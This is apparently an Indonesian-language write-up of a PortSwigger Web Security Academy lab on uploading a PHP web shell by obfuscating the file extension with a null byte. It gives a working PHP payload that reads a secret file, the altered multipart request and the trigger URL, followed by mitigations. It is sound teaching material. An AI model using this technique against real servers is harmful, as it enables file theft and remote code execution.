# Lab: Web Shell Upload via Obfuscated File Extension

---

## Summary

Lab ini mendemonstrasikan celah keamanan pada fitur upload file avatar dimana validasi ekstensi file dapat dibypass menggunakan teknik null byte (`%00`). Meskipun server hanya mengizinkan file `.jpeg` dan `.png`, attacker dapat mengupload file PHP berbahaya dengan cara mengobfuskasi nama file menjadi `exploit.php%00.png`. Server membaca ekstensi sebagai `.php` dan mengeksekusinya sebagai script, mengakibatkan **Remote Code Execution (RCE)**.

---

## Vulnerability Details

| Field      | Value                                |
|------------|--------------------------------------|
| Type       | Unrestricted File Upload             |
| CWE        | CWE-434                              |
| Severity   | High                                 |
| Target     | `/my-account/avatar`                 |
| Impact     | Remote Code Execution (RCE)          |
| Platform   | PortSwigger Web Security Academy     |

---

## Root Cause Analysis

Vulnerability ini terjadi karena adanya perbedaan cara server dan web aplikasi membaca ekstensi file yang diobfuskasi.

Web aplikasi melakukan validasi ekstensi file di sisi client/aplikasi dan membaca nama file secara utuh sebagai `exploit.php%00.png`, sehingga ekstensi yang terdeteksi adalah `.png` dan lolos validasi.

Di sisi server, karena karakter `%00` merupakan **null byte** (karakter terminasi string di bahasa C/C++), beberapa fungsi server-side membaca string hanya sampai karakter null byte tersebut. Akibatnya, nama file yang diproses server adalah `exploit.php` — dan file dieksekusi sebagai PHP script.

---

## Steps to Reproduce

**1. Login dan akses fitur upload avatar**

Login menggunakan akun normal, kemudian navigasi ke menu profile dan temukan fitur upload untuk avatar.

**2. Siapkan file exploit**

Buat file PHP dengan nama `exploit.php` berisi payload berikut:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**3. Upload file dan amati response**

Upload file `exploit.php` langsung. Request akan ditolak karena server hanya mengizinkan ekstensi `.jpeg` dan `.png`.

**4. Intercept dan modifikasi request di Burp Suite**

Tangkap request upload menggunakan Burp Suite, kirim ke **Repeater**, lalu ubah nilai `filename` pada request:

```
# Sebelum
filename="exploit.php"

# Sesudah
filename="exploit.php%00.png"
```

**5. Forward request**

Kirim ulang request yang telah dimodifikasi. File akan berhasil terupload karena aplikasi membaca ekstensi sebagai `.png`.

**6. Trigger eksekusi**

Periksa element gambar avatar di halaman profile dan cek atribut `src`-nya. Akses path berikut untuk mentrigger eksekusi PHP:

```
/files/avatars/exploit.php
```

Server akan mengeksekusi script dan mengembalikan isi file `/home/carlos/secret`.

---

## Proof of Concept

**Payload file PHP:**
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Modified HTTP Request (Burp Suite Repeater):**
```http
POST /my-account/avatar HTTP/2
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.png"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Trigger URL:**
```
GET /files/avatars/exploit.php
```

**Expected Output:**
Server mengembalikan isi dari file `/home/carlos/secret` secara langsung di response body.

---

## Impact

Jika vulnerability ini ada di environment production, attacker dapat:

- Membaca file sensitif di server (config, credentials, private keys)
- Mengeksekusi perintah sistem arbitrary melalui web shell
- Melakukan privilege escalation jika server berjalan dengan hak akses tinggi
- Menjadikan server sebagai pivot untuk menyerang sistem internal lainnya

---

## Mitigasi

- Terapkan validasi ekstensi file di sisi server berdasarkan **MIME type** dan **magic bytes**, bukan hanya nama file
- Sanitasi nama file sebelum diproses — tolak atau strip karakter null byte (`%00`) dan karakter berbahaya lainnya
- Simpan file upload di luar web root agar tidak bisa diakses langsung via URL
- Ubah nama file secara acak saat disimpan di server sehingga lokasi file tidak dapat diprediksi
- Gunakan allowlist ekstensi yang ketat, bukan blacklist

---

## References

- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PortSwigger: File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
